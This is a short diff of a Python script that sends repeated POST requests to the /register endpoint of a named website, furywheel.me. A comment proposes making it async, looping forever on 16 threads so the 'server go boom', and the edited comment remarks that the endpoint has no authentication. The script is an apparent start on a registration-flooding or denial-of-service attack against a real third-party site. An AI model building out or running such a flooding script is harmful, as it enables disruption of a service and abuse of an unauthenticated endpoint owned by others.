@@ -23,12 +23,13 @@ def main(): # make this async and while true on 16 threads and server go boom
 
         post_response = session.post("https://furywheel.me/register", data=payload)
 
-        print(f"Request {i+1}: {post_response.status_code}") # 200 , 200 (as of 01/09/2025)
+        print(f"Request {i+1}: {post_response.status_code}") # 200 , 200 (as of 01/09/2025) no auth very thats bad
 
     session.close()
 
 if __name__ == "__main__":
     main()
+
 
 
 
